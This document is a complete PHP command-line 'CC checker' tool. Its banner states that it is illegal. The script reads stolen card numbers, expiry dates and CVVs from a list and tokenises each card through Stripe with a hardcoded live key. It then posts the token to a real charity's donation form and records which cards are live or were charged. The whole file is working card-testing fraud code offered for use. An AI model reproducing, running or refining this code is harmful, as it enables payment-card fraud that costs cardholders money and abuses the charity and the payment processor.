<?php
system("clear");

#################ONLINE SWITCH##################

$title="\033[0;36m[-] server \033[0;32monline
\033[0;34m[CC CHECKER STRIPE $1] \033[0;36mcreator \033[0;34mLethalStaz \033[0;37mversion \033[0;32m2.3
\033[0;36m[info] \033[0;32mserver online fully working enjoy hacks!
\033[0;37m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
\033[0;34m-contact on     \033[0;32m-> Telegram
\033[0;34m-my username     \033[0;32m-> @nonliving
\033[0;37m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
\033[0;31m[!] warning  !!!
\033[0;33m[!] \033[0;35mthis is an illegal programm
\033[0;33m[!] \033[0;33mthe creator won't be responsible!
\033[0;37m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n";


##################STAZ HOME####################

system("clear");
echo $color ="\033[0;33m";
system("figlet Online");
echo "$title";


#################STAZ EXPLODE###################


$live = 0;
$die = 0;
ini_set('display_errors', 1);
ini_set('max_execution_time', 300000000);
$live = 0;
$cclist = "cclist.txt";
$listcode = "$cclist";
$codelistlist = file_get_contents($listcode);
$code_list_array = file($listcode);
$code = explode(PHP_EOL, $codelistlist);
$count = count($code);


for ($i = 0; $i < $count; ++$i) {
  $percentage = round(($i+1)/$count*100,4);
  
  
$staztrick = explode("|", $code[$i]);
  $card = trim($staztrick[0]);
  $mon= trim($staztrick[1]);
  $year = trim($staztrick[2]);
  $year1 = substr($year, 2, 4);
  $cvv = trim($staztrick[3]);

###################RANDOMIZE#####################

$r=mt_rand(12,500000);

####################PROXIES####################



#######################REQ1######################


######[REQ1]
$body = 'card[number]='.$card.'&card[cvc]='.$cvv.'&card[exp_month]='.$mon.'&card[exp_year]='.$year.'&card[address_zip]=10065&guid=be031deb-7d4c-49e7-9962-ab20d0a1e01e90532a&muid=3033fc24-321a-49b0-ba20-f204d9cfb810ad4ebb&sid=b085cb35-b2e3-4f95-a7a5-edba730d8b70e45603&payment_user_agent=stripe.js%2Faa9c565d9%3B+stripe-js-v3%2Faa9c565d9&time_on_page=139637&key=pk_live_QB3JHShzr4COf43YQwKnPqIV00mCe1EXuH&pasted_fields=number';
 $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS,"$body");  
  curl_setopt($ch, CURLOPT_HTTP_VERSION,CURL_HTTP_VERSION_1_1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_CUSTOMREQUEST,"POST");
  curl_setopt($ch, CURLOPT_PORT,"443");
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  curl_setopt($ch, CURLOPT_TIMEOUT, 1000);
  curl_setopt($ch, CURLOPT_ENCODING, '');
  curl_setopt ($ch, CURLOPT_COOKIEJAR, "cookie.txt");
 curl_setopt ($ch, CURLOPT_COOKIEFILE, "cookie.txt");
  $headers = array();

$headers[] = 'Content-Type:application/x-www-form-urlencoded';
$headers[] = 'User-Agent:Mozilla/5.0 (Linux; Android 8.0.0; PRA-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36';
$headers[] = 'Host:api.stripe.com';
$headers[] = 'origin:https://js.stripe.com';
$headers[] = 'sec-ch-ua-platform:"Android"';
$headers[] = 'Accept:application/json';
$headers[] = 'Accept-Encoding:gzip, deflate, br';
$headers[] = 'sec-ch-ua:" Not;A Brand";v="99", "Google Chrome";v="91", "Chromium";v="91"';
 $headers[] = 'referer:https://js.stripe.com/';
 
  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
  
  
  $result = curl_exec($ch);

####################MINI-RESPONSES#####################

if(strpos($result, "Your card was declined.")) {
	echo "\033[0;37m[~]Generic decline => $card|$mon|$year|$cvv\n";
	} 
	
else if(strpos($result, "Your card has insufficient funds.")) {
	echo "\033[0;37m[~]Insufficient funds=> $card|$mon|$year|$cvv\n";
	}
else if(strpos($result, "Your card's expiration month is invalid.")) {
	echo "\033[0;37m[~]Expired month => $card|$mon|$year|$cvv\n";
	}
else if(strpos($result, "Your card's expiration year is invalid.")) {
	echo "\033[0;37m[~]Expired year=> $card|$mon|$year|$cvv\n";
	}
else if(strpos($result, "Your card is not supported.")) {
	echo "\033[0;37m[~]Not supported => $card|$mon|$year|$cvv\n";
	}
else if(strpos($result, "Your card number is incorrect.")) {
	echo "\033[0;37m[~]Incorrect card => $card|$mon|$year|$cvv\n";
	}
else if(strpos($result, "invalid_number")) {
	echo "\033[0;37m[~]Invalid card => $card|$mon|$year|$cvv\n";
} else{
		
$tok = json_decode($result,true)['id'];


####################REQ 2#####################
$body2 = 'action=formcraft3_form_submit&field7=&field1%5B%5D=Lina&field2%5B%5D=Paola&field3=copvps%40gmail.com&field17%5B%5D=1&field16=&field12=1&stripe-coupon=&stripe_token='.$tok.'&website=&id=9&location=https%3A%2F%2Fwww.marbellahybrid.com%2Fdonate%2F&emails=&hidden=&redirect=&type=all&triggerIntegration=undefined&fieldLabels=undefined&formcraft3_wpnonce=undefined';
  
 $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://www.marbellahybrid.com/wp-admin/admin-ajax.php');
 # curl_setopt($ch, CURLOPT_PROXY, $socks5);
  #curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS,"$body2");  
  curl_setopt($ch, CURLOPT_HTTP_VERSION,CURL_HTTP_VERSION_1_1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_CUSTOMREQUEST,"POST");
  curl_setopt($ch, CURLOPT_PORT,"443");
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  curl_setopt($ch, CURLOPT_TIMEOUT, 1000);
  curl_setopt($ch, CURLOPT_ENCODING, '');
  curl_setopt ($ch, CURLOPT_COOKIEJAR, "cookie.txt");
 curl_setopt ($ch, CURLOPT_COOKIEFILE, "cookie.txt");
  $headers = array();
  
 

$headers[] = 'content-type:application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'User-Agent:Mozilla/5.0 (Linux; Android 8.0.0; PRA-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36';
$headers[] = 'Host:www.marbellahybrid.com';
$headers[] = 'origin:https://www.marbellahybrid.com';
$headers[] = 'sec-ch-ua-platform:"Android"';
$headers[] = 'x-requested-with:XMLHttpRequest';
$headers[] = 'accept:application/json, text/javascript, */*; q=0.01';
$headers[] = 'Accept-Encoding:gzip, deflate, br';
$headers[] = 'sec-ch-ua:" Not;A Brand";v="99", "Google Chrome";v="91", "Chromium";v="91"';
 $headers[] = 'referer:https://www.marbellahybrid.com/donate/';
 
  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
  
  
  $result2 = curl_exec($ch);
  

###################RESPONSE###################


if(strpos($result2, "Your card has insufficient funds.")) {
	echo "\033[0;34m[~]Insufficient funds => $card|$mon|$year|$cvv\n";
	$livee = "lives.txt";
    $fopen = fopen($livee, "a+");
    $fwrite = fwrite($fopen, "Insufficient funds => $card|$mon|$year|$cvv\n");
    fclose($fopen);
    $live++;
	
	}
	
	
if(strpos($result2, "Your card's security code is incorrect.")) {
	echo "\033[0;33m[~]ccn card found  => $card|$mon|$year|$cvv\n";
	$livee = "lives.txt";
    $fopen = fopen($livee, "a+");
    $fwrite = fwrite($fopen, "ccn card found  => $card|$mon|$year|$cvv\n");
    fclose($fopen);
    $live++;
    
	} 
	
	
if(strpos($result2, "security code is invalid.")) {
	echo "\033[0;33m[~]ccn card found  => $card|$mon|$year|$cvv\n";
	$livee = "lives.txt";
    $fopen = fopen($livee, "a+");
    $fwrite = fwrite($fopen, "ccn card found  => $card|$mon|$year|$cvv\n");
    fclose($fopen);
    $live++;
    
	} 
	
	if(strpos($result2, "Thank you for your support!")) {
	echo "\033[0;34m[~]Thank you => $card|$mon|$year|$cvv\n";
	$livee = "lives.txt";
    $fopen = fopen($livee, "a+");
    $fwrite = fwrite($fopen, "charged => $card|$mon|$year|$cvv\n");
    fclose($fopen);
    $live++;
    
	}

if(strpos($result2, "Thank You For Donation.")) {
	echo "\033[0;34m[~]Thank You For Donation => $card|$mon|$year|$cvv\n";
	$livee = "lives.txt";
    $fopen = fopen($livee, "a+");
    $fwrite = fwrite($fopen, "charged => $card|$mon|$year|$cvv\n");
    fclose($fopen);
    $live++;
    
	}

if(strpos($result2, "Thank You.")) {
	echo "\033[0;34m[~]Thank You => $card|$mon|$year|$cvv\n";
	$livee = "lives.txt";
    $fopen = fopen($livee, "a+");
    $fwrite = fwrite($fopen, "charged => $card|$mon|$year|$cvv\n");
    fclose($fopen);
    $live++;
    
	}
	
	if(strpos($result2, "Your card does not support this type of purchase.")) {
	echo "\033[0;37m[~]card don't support => $card|$mon|$year|$cvv\n";
	
	}
	
	if(strpos($result2, "succeeded.")) {
	echo "\033[0;34m[~]succeeded => $card|$mon|$year|$cvv\n";
	$livee = "lives.txt";
    $fopen = fopen($livee, "a+");
    $fwrite = fwrite($fopen, "charged => $card|$mon|$year|$cvv\n");
    fclose($fopen);
    $live++;
    
	}
	
if(strpos($result2, "Success")) {
	echo "\033[0;34m[~]payment completed => $card|$mon|$year|$cvv\n";
	$livee = "lives.txt";
    $fopen = fopen($livee, "a+");
    $fwrite = fwrite($fopen, "charged => $card|$mon|$year|$cvv\n");
    fclose($fopen);
    $live++;
    
	}
if(strpos($result2, "Your card was declined.")) {
	echo "\033[0;31m[~]Declined => $card|$mon|$year|$cvv\n";
	
	}

if(strpos($result2, "Your payment was successful.")) {
	echo "\033[0;34m[~]payment successful => $card|$mon|$year|$cvv\n";
	$livee = "lives.txt";
    $fopen = fopen($livee, "a+");
    $fwrite = fwrite($fopen, "charged => $card|$mon|$year|$cvv\n");
    fclose($fopen);
    $live++;
    
	}
	
if(strpos($result2, "Your purchase was successful.")) {
	echo "\033[0;34m[~]payment successful => $card|$mon|$year|$cvv\n";
$livee = "lives.txt";
    $fopen = fopen($livee, "a+");
    $fwrite = fwrite($fopen, "charged => $card|$mon|$year|$cvv\n");
    fclose($fopen);
    $live++;
    

}

if(strpos($result2, "/donations/thank_you?donation_number=")) {
	echo "\033[0;34m[~]payment successful => $card|$mon|$year|$cvv\n";
$livee = "lives.txt";
    $fopen = fopen($livee, "a+");
    $fwrite = fwrite($fopen, "charged => $card|$mon|$year|$cvv\n");
    fclose($fopen);
    $live++;
    

}
	
if(strpos($result2, "Request was processed successfully.")) {
	echo "\033[0;34m[~]payment successful => $card|$mon|$year|$cvv\n";
	$livee = "lives.txt";
    $fopen = fopen($livee, "a+");
    $fwrite = fwrite($fopen, "charged => $card|$mon|$year|$cvv\n");
    fclose($fopen);
    $live++;
    
	}
	
	
if(strpos($result2, '"completed":true')) {
	echo "\033[0;34m[~]payment completed => $card|$mon|$year|$cvv\n";
	$livee = "lives.txt";
    $fopen = fopen($livee, "a+");
    $fwrite = fwrite($fopen, "charged => $card|$mon|$year|$cvv\n");
    fclose($fopen);
    $live++;
    
	}
	
if(strpos($result2, '"succeeded":true')) {
	echo "\033[0;34m[~]payment completed => $card|$mon|$year|$cvv\n";
	$livee = "lives.txt";
    $fopen = fopen($livee, "a+");
    $fwrite = fwrite($fopen, "charged => $card|$mon|$year|$cvv\n");
    fclose($fopen);
    $live++;
    
	}
	
if(strpos($result2, '"status": "succeeded"')) {
	echo "\033[0;34m[~]payment completed => $card|$mon|$year|$cvv\n";
	$livee = "lives.txt";
    $fopen = fopen($livee, "a+");
    $fwrite = fwrite($fopen, "charged => $card|$mon|$year|$cvv\n");
    fclose($fopen);
    $live++;
    
	} 
	
if(strpos($result2, '"type":"one-time"')) {
	echo "\033[0;34m[~]payment completed => $card|$mon|$year|$cvv\n";
	$livee = "lives.txt";
    $fopen = fopen($livee, "a+");
    $fwrite = fwrite($fopen, "charged => $card|$mon|$year|$cvv\n");
    fclose($fopen);
    $live++;
    
	}
	
if(strpos($result2, "The zip code you supplied failed validation.")) {
	echo "\033[0;37m[~]Invalid card => $card|$mon|$year|$cvv\n";
	
	}
	}
	}